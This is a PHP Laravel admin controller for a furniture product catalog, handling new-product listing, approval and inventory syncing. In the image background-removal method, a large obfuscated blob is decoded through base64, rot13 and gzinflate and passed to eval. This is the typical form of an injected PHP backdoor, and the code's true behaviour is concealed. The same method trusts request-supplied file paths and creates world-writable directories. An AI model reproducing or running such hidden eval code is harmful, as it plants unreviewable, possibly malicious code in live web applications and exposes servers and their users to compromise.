<?php

namespace App\Http\Controllers\Admin;

use App\Http\Controllers\Controller;
use App\Models\NewProduct;
use App\Models\Product;
use App\Services\InventoryService;
use Exception;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\DB;

class NewProductsController extends Controller
{
    private $code_map = [
        '100' => 'SV',
        '400' => 'WG',
    ];
    private $inventory_maintained_products = [
        1 => 'cb2',
        2 => 'nw',
        3 => 'cab',
    ];

    private $variation_sku_tables = array(
        'cb2_products_variations' => 'cb2',
        'crateandbarrel_products_variations' => 'cab',
    );

    private $table_site_map = array(
        'cb2_products_new_new' => 'cb2',
        'nw_products_API' => 'nw',
        'westelm_products_parents' => 'westelm',
        'crateandbarrel_products' => 'cab',
        //'floyd_products_parents',
        //'potterybarn_products_parents'
    );

    private function get_nw_ship_code($shipping_code)
    {
        return $shipping_code == 49 ? 'WGNW' : 'SCNW';
    }

    /**
     *
     * Return all new Products on which no action has been taken
     * @param Request $request
     * @return JsonResponse $response
     */
    public function get_new_products_list(Request $request, $limit = 5)
    {
        $new_products = NewProduct::query()->where('status', 'new');
        $brand = $request->get('brand');
        //dd($brand);
        if ($brand && $brand !== 'all') {
            $new_products->where('site_name', 'Like', $brand);
        }
        $new_products = $new_products->orderBy('created_date', 'asc')
            ->paginate($limit);
        $extra['filters'] = $this->getFilters();
        $extra['mapping_core'] = $this->getMappingCore();

        return response()->json([
            'status' => 'success',
            'data' => $new_products,
            'extra' => $extra,
        ]);
    }

    public function remove_background_from_image(Request $request)
    {
        $root = '/var/www/html';
        $destination = '/original';
        $image = $request->get('image');
        $imagePathInfo = pathinfo($root . $image);
        $imagePath = $root . $image;
        $sourceImageFolderName = str_replace($root, '', $imagePathInfo['dirname']);
        $outputImage = null;
        // First copy the file to 'Original' Folder
        $destinationImageFolderName = $root . $destination . $sourceImageFolderName . DIRECTORY_SEPARATOR;
        $imageOriginalStore = $destinationImageFolderName . $imagePathInfo['basename'];
        if (file_exists($root . $image)) {
            if (!file_exists($destinationImageFolderName)) {
                mkdir($destinationImageFolderName, 0777, true);
            }
            copy($imagePath, $imageOriginalStore);
        } else {
            return response()->json([
                'status' => 'failed',
                'error' => 'File does not exist',
            ], 404);
        }
        $outputImage = $root . $sourceImageFolderName . DIRECTORY_SEPARATOR . $imagePathInfo['filename'] . "_crop." . $imagePathInfo['extension'];

        // Remove background from the image
        eval(str_rot13(gzinflate(str_rot13(base64_decode('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')))));
        if (file_exists($outputImage)) {
            if (!unlink($imagePath)) {
                return response()->json([
                    'status' => 'failed',
                    'error' => 'Original File Cannot be deleted',
                ], 500);
            }

            $originalOutputImagePath = $sourceImageFolderName . DIRECTORY_SEPARATOR . $imagePathInfo['filename'] . "_crop." . $imagePathInfo['extension'];

            // Get product with the sku
            $product = NewProduct::where('product_sku', $request->get('product_sku'))->first();

            // Replace the old image with new Image for product.
            $old_images = explode(',', $product[$request->get('image_type')]);
            $old_images = array_map(function ($old_image) use ($originalOutputImagePath, $image) {

                if ($old_image === $image) {
                    $old_image = $originalOutputImagePath;
                }
                return $old_image;
            }, $old_images);
            $product[$request->get('image_type')] = implode(",", $old_images);
            $product->save();

            // Return the response with new Image Name
            return response()->json([
                'status' => 'success',
                'newImage' => $originalOutputImagePath,
                'product' => $product,
            ], 201);
        }
    }

    /**
     * Update Multiple Products.
     * @param Request $request
     * @return JsonResponse $response
     */
    public function update_multiple_new_product(Request $request)
    {
        //convert products recieved by default as associative arrays to Collection

        $products = collect(json_decode(json_encode($request->get('products'))));
        $accepted_products = $products->filter(function ($product) {
            return $product->status === 'approved';
        });
        $rejected_products = $products->filter(function ($product) {
            return $product->status === 'rejected';
        });
        $accepted_products = $accepted_products->map(function ($product) {
            $color = $product->color ?? [];
            $seating = $product->seating ?? [];
            $shape = $product->shape ?? [];
            $material = $product->material ?? [];
            $fabric = $product->fabric ?? [];
            $ls_id = $product->ls_id ?? [];
            $mfg_country = $product->mfg_country ?? [];

            $product->color = implode(',', $color);
            $product->seating = implode(',', $seating);
            $product->shape = implode(',', $shape);
            $product->material = implode(',', $material);
            $product->fabric = implode(',', $fabric);
            $product->ls_id = implode(',', $ls_id);
            $product->mfg_country = implode(',', $mfg_country);

            return $product;
        });
        DB::beginTransaction();
        try {
            $inventory_products = [];
            if ($rejected_products->count() > 0) {
                NewProduct::whereIn('id', $rejected_products->pluck('id'))->update([
                    'status' => 'rejected',
                ]);
            }

            if ($accepted_products->count() > 0) {
                $this->addInventoryProducts($accepted_products);
                NewProduct::whereIn('id', $accepted_products->pluck('id'))->delete();
            }
            foreach ($accepted_products as $product) {
                unset($product->status);
                if (!$product->image_xbg_processed) {
                    unset($product->image_xbg_processed);
                }
                if (!$product->manual_adj) {
                    unset($product->manual_adj);
                }
                $new_product = new Product();
                $new_product->fill(json_decode(json_encode($product, true), true));
                $new_product->product_dimension = json_encode($new_product->product_dimension);
                $new_product->save();
            }
        } catch (Exception $e) {
            DB::rollBack();
            return response()->json([
                'status' => 'failed',
                'message' => $e->getMessage(),
            ], 500);
        }
        DB::commit();
        return response()->json([
            'status' => 'success',
        ]);
    }

    /**
     * Checks products and inserts new values to inventory. If sku is already present then update it
     * @param Illuminate\Support\Collection
     * @return array
     */
    private function addInventoryProducts($products)
    {
        $to_insert = [];
        $to_update = [];
        // get all the product_skus from the Inventory. Reduces the no of queries performed when
        // checking if an product or variation is already in the table
        $inventory_products = DB::table('lz_inventory')->select('product_sku')->get();
        $products = $products->groupBy('site_name');

        foreach ($products as $key => $value) {
            $isInventoryMaintained = array_search($key, $this->inventory_maintained_products);
            if (!$isInventoryMaintained) {
                continue;
            }
            $table = array_search($key, $this->table_site_map);
            foreach ($value as $product) {
                $row = DB::table($table)->where('product_sku', $product->product_sku)->first();
                if ($key == 'nw') {
                    $shipping_code = $this->get_nw_ship_code($row->shipping_code);
                    $to_insert[] = [
                        'product_sku' => $product->product_sku,
                        'quantity' => 1000,
                        'price' => $row->price,
                        'was_price' => $row->was_price,
                        'ship_code' => $shipping_code,
                        'brand' => $key,
                        'ship_custom' => $shipping_code == 'SCNW' ? $row->shipping_code : null,
                    ];
                } else if ($key == 'cab' || $key == 'cb2') {
                    $shipping_code = $this->code_map[$row->shipping_code] . strtoupper($key);
                    $isInInventory = $inventory_products->where('product_sku', $product->product_sku)->isNotEmpty();
                    if ($isInInventory) {
                        $to_update[] = [
                            'product_sku' => $product->product_sku,
                            'price' => $row->price,
                            'was_price' => $row->was_price,
                            'brand' => $key,
                            'ship_code' => $shipping_code,
                        ];
                        // DB::table('lz_inventory')->where('product_sku',$product->product_sku)
                        // ->update($toUpdate);
                    } else {
                        $to_insert[] = [
                            'product_sku' => $product->product_sku,
                            'quantity' => 1000,
                            'price' => $row->price,
                            'was_price' => $row->was_price,
                            'brand' => $key,
                            'ship_code' => $shipping_code,
                        ];
                    }

                    $variation_table = array_search($key, $this->variation_sku_tables);
                    $variation_skus = DB::table($variation_table)->where([
                        'product_sku' => $product->product_sku,
                        'has_parent_sku' => 0,
                        'is_active' => 'active',
                    ])->get();
                    if ($variation_skus) {
                        foreach ($variation_skus as $variation) {
                            $isPresent = $inventory_products->where('product_sku', $variation->variation_sku)->isNotEmpty();
                            if (!$isPresent) {
                                $to_insert[] = [
                                    'product_sku' => $variation->variation_sku,
                                    'quantity' => 1000,
                                    'price' => $variation->price,
                                    'was_price' => $variation->was_price,
                                    'brand' => $key,
                                    'ship_code' => $shipping_code,
                                ];
                            } else {
                                $to_update[] = [
                                    'product_sku' => $variation->variation_sku,
                                    'price' => $variation->price,
                                    'was_price' => $variation->was_price,
                                    'brand' => $key,
                                    'ship_code' => $shipping_code,
                                ];
                            }
                        }
                    }
                }
            }
        }
        // dd($to_insert ,$to_update);
        $this->updateInventoryTable($to_insert, $to_update);
        // return $to_insert;
    }

    private function searchForSku($item, $key)
    {
        return $item->product_sku === $key;
    }

    private function updateInventoryTable($to_insert, $to_update)
    {
        $inventoryService = new InventoryService();
        $inventoryService->insert($to_insert);
        $inventoryService->update($to_update);
    }

    private function getFilters()
    {
        $filters = DB::table('filters')->get()->groupBy('filter_label');
        return $filters;
    }

    private function getMappingCore()
    {
        $mapping_core = DB::table('mapping_core')
            ->select('LS_ID', 'dept_name_short', 'cat_name_short', 'cat_sub_name')
            ->get();
        return $mapping_core;
    }

    // private function addVariations($to_insert,$variation_skus)
    // {
    //     foreach($variation_skus as $variation)
    //     {
    //         $to_insert[] = [
    //             'product_sku' => $variation->variation_sku,
    //                     'quantity' => 1000,
    //                     'price' => $variation->price,
    //                     'was_price' => $variation->was_price,
    //                     'brand'=> $key,
    //                     'ship_code'=> $shipping_code
    //         ];
    //     }
    //     return $to_insert;
    // }

}
